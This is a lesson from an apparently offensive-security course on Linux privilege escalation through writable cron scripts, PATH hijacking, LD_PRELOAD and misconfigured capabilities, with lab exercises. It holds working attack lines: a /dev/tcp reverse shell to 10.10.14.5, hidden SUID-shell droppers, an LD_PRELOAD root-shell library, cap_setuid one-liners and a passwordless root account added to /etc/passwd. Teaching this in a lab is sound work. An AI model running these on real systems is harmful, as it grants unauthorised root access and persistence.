---
title: "Cron, Environment Variables, and Linux Capabilities"
tags: [foundation, linux, cron, PATH-hijacking, LD_PRELOAD, capabilities,
       getcap, privilege-escalation, attacker-mindset]
module: 01-Foundation-02
day: 11
related_topics:
  - Linux Processes, Networking CLI and Bash (Day 010)
  - SUID, Sudo and Package Trust (Day 012)
  - Linux PrivEsc — full chain (Day 234)
---

# Day 011 — Cron, Environment Variables, and Linux Capabilities

## Goals

By the end of this lesson you will be able to:

1. Read and write `crontab` entries; understand every field in the format.
2. Exploit a writable cron script running as root to gain a root shell.
3. Explain PATH hijacking in the context of cron jobs and setuid binaries.
4. Understand `LD_PRELOAD` and `LD_LIBRARY_PATH` — what they do, and when
   the kernel ignores them (hint: setuid).
5. Enumerate Linux capabilities with `getcap` and `capsh`.
6. Explain at least five capabilities that are dangerous when granted to
   unprivileged binaries (e.g. `cap_net_raw`, `cap_setuid`, `cap_dac_override`).
7. Exploit a binary with `cap_setuid` to escalate privileges.

---

## Prerequisites

- [Day 009 — Linux Filesystem, Permissions and Users](DAY-0009-Linux-Filesystem-Permissions-and-Users.md)
- [Day 010 — Linux Processes, Networking CLI and Bash](DAY-0010-Linux-Processes-Networking-and-Bash.md)

---

## Main Content — Part 1: Cron Jobs in Depth

### 1. The Cron Daemon and How It Works

`cron` is the time-based job scheduler in Linux. The daemon (`crond` or
`cron`) wakes up every minute, reads all crontab files, and executes
commands whose schedule matches the current time.

**Important files and directories:**

| Path | Who can edit | Purpose |
|---|---|---|
| `/etc/crontab` | root | System-wide crontab; has a user field |
| `/etc/cron.d/` | root | Drop-in crontabs; used by packages |
| `/etc/cron.hourly/` | root | Scripts run hourly (no crontab syntax) |
| `/etc/cron.daily/` | root | Scripts run daily |
| `/etc/cron.weekly/` | root | Scripts run weekly |
| `/etc/cron.monthly/` | root | Scripts run monthly |
| `/var/spool/cron/crontabs/` | per-user | Each user's personal crontab |

**Reading cron jobs:**

```bash
# Current user
crontab -l

# Specific user (requires root)
crontab -u alice -l

# System crontab
cat /etc/crontab

# All drop-in crontabs
cat /etc/cron.d/*

# All cron directory scripts
ls -la /etc/cron.{hourly,daily,weekly,monthly}/
```

---

### 2. Crontab Format — Precision Matters

```
# ┌─── minute     (0–59)
# │ ┌─── hour      (0–23)
# │ │ ┌─── day/month (1–31)
# │ │ │ ┌─── month    (1–12 or jan–dec)
# │ │ │ │ ┌─── day/week  (0–7, 0 = Sunday = 7)
# │ │ │ │ │  ┌─── [user field — only in /etc/crontab and /etc/cron.d/]
# │ │ │ │ │  │     ┌─── command
# * * * * * root  /opt/scripts/backup.sh
```

**Special strings:**

| String | Equivalent | Meaning |
|---|---|---|
| `@reboot` | — | Run once at startup |
| `@hourly` | `0 * * * *` | Every hour |
| `@daily` | `0 0 * * *` | Every day at midnight |
| `@weekly` | `0 0 * * 0` | Every Sunday at midnight |
| `@monthly` | `0 0 1 * *` | First of every month |
| `@annually` | `0 0 1 1 *` | Once a year |

**Step values:**

```
*/5 * * * *    → every 5 minutes
0 */2 * * *    → every 2 hours on the hour
```

---

### 3. Privilege Escalation via Writable Cron Scripts

This is one of the most reliable privesc paths on poorly configured Linux
systems. The attack: a root-owned cron job executes a script → if that script
is writable by a lower-privileged user → inject a reverse shell.

**Step 1 — Identify root cron jobs:**

```bash
cat /etc/crontab
cat /etc/cron.d/*
# Look for entries with "root" in the user field
# Example:
# * * * * * root /opt/scripts/cleanup.sh
```

**Step 2 — Check script permissions:**

```bash
ls -la /opt/scripts/cleanup.sh
# -rwxrwxr-x 1 root root 123 Jan 01 /opt/scripts/cleanup.sh
# ^^ group-writable → exploitable if you're in that group
# or:
# -rwxrwxrwx 1 root root 123 → world-writable → anyone can write
```

**Step 3 — Inject payload:**

```bash
# Append a reverse shell to the writable cron script
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/scripts/cleanup.sh

# Or add an SUID shell (stealthier, survives disconnect)
echo 'cp /bin/bash /tmp/.ghost_shell; chmod +s /tmp/.ghost_shell' \
    >> /opt/scripts/cleanup.sh

# Wait for cron to run, then:
/tmp/.ghost_shell -p    # -p keeps the effective UID (root)
```

**Defence (preview — covered on Day 016):**

- Scripts called by root cron should be owned and writable only by root.
- Use `chmod 700` and `chown root:root` on cron scripts.
- Audit with: `find /etc/cron* /opt/scripts -writable 2>/dev/null`

---

### 4. PATH Hijacking in Cron Jobs

Cron jobs inherit a minimal `PATH`:
`/usr/bin:/bin` (varies by distro — often not including `/usr/local/bin`).

If a cron job runs a command **without an absolute path** — e.g.
`backup.sh` instead of `/opt/scripts/backup.sh` — and you can write to a
directory that appears **earlier** in the cron PATH, you win.

**Attacking it:**

```bash
# Crontab entry:
# * * * * * root cleanup

# No absolute path → cron searches its PATH
# If you can write to /usr/local/bin (before /usr/bin in cron's PATH):
cat > /usr/local/bin/cleanup << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/.priv && chmod +s /tmp/.priv
EOF
chmod +x /usr/local/bin/cleanup
# Wait for cron, then:
/tmp/.priv -p
```

**The same logic applies to scripts using relative tool names:**

```bash
# Script contains: tar -czf /backup/data.tar.gz /data
# If /tmp is in PATH before /bin:
echo '#!/bin/bash' > /tmp/tar
echo 'cp /bin/bash /tmp/.r; chmod +s /tmp/.r' >> /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
```

**Key insight:** Always run cron scripts with absolute paths for every
command. Relative paths in any script run as root are a vulnerability.

---

## Main Content — Part 2: LD_PRELOAD and Dynamic Linker Attacks

### 5. How the Dynamic Linker Works

When you run an ELF binary, the kernel hands control to the dynamic linker
(`/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2`). The linker:

1. Reads the binary's `.dynamic` section to find required shared libraries.
2. Searches for them in: `LD_LIBRARY_PATH` → `/etc/ld.so.cache` → `/lib` →
   `/usr/lib` → etc.
3. Maps them into memory.
4. Resolves symbols.
5. Jumps to `main()`.

---

### 6. LD_PRELOAD — Force-Load a Library

`LD_PRELOAD` tells the linker: "Load this library before everything else."
Any function in the preloaded library overrides the same function in any
later library — including `libc`.

**Simple example — override `getuid()`:**

```c
// evil.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Called when the library is loaded
void __attribute__((constructor)) pwn() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -shared -fPIC -o /tmp/evil.so evil.c -nostartfiles
LD_PRELOAD=/tmp/evil.so /usr/bin/some-setuid-binary
```

**Critical security rule — the kernel blocks this for setuid binaries:**
The dynamic linker ignores `LD_PRELOAD`, `LD_LIBRARY_PATH`, and
`LD_AUDIT` when the effective UID ≠ real UID (i.e. when running a
setuid binary). This is a kernel-enforced protection.

**When does LD_PRELOAD still work for privesc?**

1. **Sudo with `env_keep`:** If `/etc/sudoers` contains
   `Defaults env_keep+=LD_PRELOAD`, the preloaded library is passed through
   to the command run by sudo — which executes as root.
2. **A service runs a custom binary that calls `dlopen()` directly** and
   doesn't clear the environment.
3. **Poorly configured sudo rules** that allow running env-setting commands.

**Checking if sudo passes env vars:**

```bash
sudo -l
# Look for: env_keep, env_reset (good), NOPASSWD + dangerous commands
```

---

## Main Content — Part 3: Linux Capabilities

### 7. What Are Capabilities?

Linux capabilities break the monolithic root privilege into ~40 discrete
units. Instead of needing full root to open a raw socket, a binary can be
granted only `CAP_NET_RAW`.

This is meant to reduce exposure — but misconfigured capabilities on
unprivileged binaries create trivial privilege escalation paths.

**Key capability table (attacker focus):**

| Capability | What it allows | Why it's dangerous |
|---|---|---|
| `cap_setuid` | `setuid()` to any UID including 0 | Direct root access via `setuid(0)` |
| `cap_setgid` | `setgid()` to any GID | Escalate to any group |
| `cap_dac_override` | Bypass all file permission checks | Read `/etc/shadow`, write anywhere |
| `cap_dac_read_search` | Bypass read/execute permission checks | Read any file |
| `cap_net_raw` | Use raw sockets, packet capture | Capture credentials on network |
| `cap_net_bind_service` | Bind to ports < 1024 | Less dangerous by itself |
| `cap_sys_admin` | Broad: mount, namespaces, much more | Essentially root |
| `cap_sys_ptrace` | `ptrace()` any process | Read memory of any process |
| `cap_sys_chroot` | `chroot()` arbitrary directories | Container escape, path manipulation |
| `cap_fowner` | Bypass file ownership checks | `chmod` any file, including /etc/shadow |

---

### 8. Enumerating Capabilities

Capabilities can be set on **files** (effective, permitted, inheritable) or on
**processes** (effective, permitted, inheritable, ambient, bounding).

```bash
# Find binaries with file capabilities set
getcap -r / 2>/dev/null

# Typical output:
# /usr/bin/python3.10 = cap_setuid+ep
# /usr/bin/perl       = cap_setuid+ep
# /usr/sbin/tcpdump   = cap_net_raw+ep
# /usr/bin/ping       = cap_net_raw+ep (common, less dangerous)

# Check capabilities of a running process
cat /proc/self/status | grep -i cap
# CapPrm: 0000000000000000
# CapEff: 0000000000000000
# CapBnd: 000001ffffffffff

# Decode capability bitmask
capsh --decode=0000000000000400
# = cap_net_raw

# Show current process capabilities in human-readable form
capsh --print
```

**The `+ep` suffix means:**
- `e` = effective (capability is active)
- `p` = permitted (capability can be activated)
- `i` = inheritable (passed to child processes)

---

### 9. Exploiting cap_setuid on Python

This is a common CTF and real-world finding:

```bash
# Discovered: /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Result: root shell — no password, no sudo, no SUID bit required
```

**Why it works:** Python has `cap_setuid` effective — it can call `setuid(0)`
even as an unprivileged user. Once UID is 0, `/bin/bash` runs as root.

**Same exploit for Perl, Ruby, Node.js:**

```bash
# Perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Ruby with cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# Node.js with cap_setuid
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",
    {stdio: "inherit"})'
```

---

### 10. Exploiting cap_dac_override

If a binary has `cap_dac_override`, it can read/write any file regardless
of permissions. The classic abuse: read `/etc/shadow` to crack root's hash.

```bash
# Discovered: /usr/bin/vim = cap_dac_override+ep
# Read /etc/shadow directly
vim /etc/shadow

# Or use Python with cap_dac_override to add a root user
python3 -c "
open('/etc/passwd','a').write(
    'ghost::0:0::/root:/bin/bash\n'
)"
# Then: su ghost (no password)
```

---

## Key Takeaways

1. **Cron jobs running as root with writable scripts are a direct path to
   root.** Enumerate `/etc/crontab`, `/etc/cron.d/`, and all cron directories.
   Check every script's permissions.
2. **Relative commands in cron scripts = PATH hijacking.** If a cron job
   calls `backup` instead of `/usr/bin/backup`, and you can write earlier
   in `PATH`, you control what runs as root.
3. **`LD_PRELOAD` is blocked for setuid binaries** by the kernel — but
   passes through with `sudo env_keep`. Always check `sudo -l` for
   `env_keep` when thinking about LD_PRELOAD privesc.
4. **Linux capabilities are the alternative to setuid root.** A binary with
   `cap_setuid+ep` is as dangerous as a setuid-root binary — sometimes more
   so, because administrators miss them.
5. **`getcap -r / 2>/dev/null`** should be in your first post-landing
   enumeration checklist. `cap_setuid` on an interpreter is instant root.

---

## Exercises

### Exercise 1 — Cron Exploitation

Set up a deliberate misconfiguration on your lab machine:

```bash
# As root: create a vulnerable cron setup
echo '* * * * * root /opt/cron-lab/cleanup.sh' >> /etc/crontab
mkdir -p /opt/cron-lab
echo '#!/bin/bash' > /opt/cron-lab/cleanup.sh
echo 'find /tmp -mtime +1 -delete' >> /opt/cron-lab/cleanup.sh
chown root:root /opt/cron-lab/cleanup.sh
chmod 777 /opt/cron-lab/cleanup.sh   # intentionally world-writable
```

Now, as an unprivileged user:

1. Discover the writable cron script.
2. Inject a payload that copies `/bin/bash` to `/tmp/.shell` and sets the
   SUID bit.
3. Wait for cron to run (up to 60 seconds).
4. Execute `/tmp/.shell -p` and confirm you have root.
5. Clean up your traces.

---

### Exercise 2 — PATH Hijacking

1. As root, create a cron job that calls a command without an absolute path:

```bash
echo '* * * * * root PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:\
/usr/sbin:/usr/bin; checklog' >> /etc/crontab
```

2. As an unprivileged user, find a writable directory earlier in that PATH.
3. Create a malicious `checklog` script.
4. Get root.

---

### Exercise 3 — Capabilities

1. On your lab machine, grant Python a dangerous capability:

```bash
sudo setcap cap_setuid+ep /usr/bin/python3
```

2. As a regular user, use `getcap -r /usr/bin 2>/dev/null` to discover it.
3. Exploit it to get a root shell.
4. Remove the capability: `sudo setcap -r /usr/bin/python3`

---

### Exercise 4 — LD_PRELOAD via Sudo

1. Add an unsafe sudo rule to `/etc/sudoers` (in a lab only!):

```
Defaults env_keep+=LD_PRELOAD
alice ALL=(ALL) NOPASSWD: /usr/bin/find
```

2. As alice, write the `evil.c` library from this lesson.
3. Compile it and use `LD_PRELOAD` with sudo to get a root shell.
4. Explain exactly why this works and the correct fix.

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 010 — Linux Processes, Networking CLI and Bash](DAY-0010-Linux-Processes-Networking-and-Bash.md)*
*Next: [Day 012 — SUID, Sudo and Package Trust](DAY-0012-SUID-Sudo-and-Package-Trust.md)*
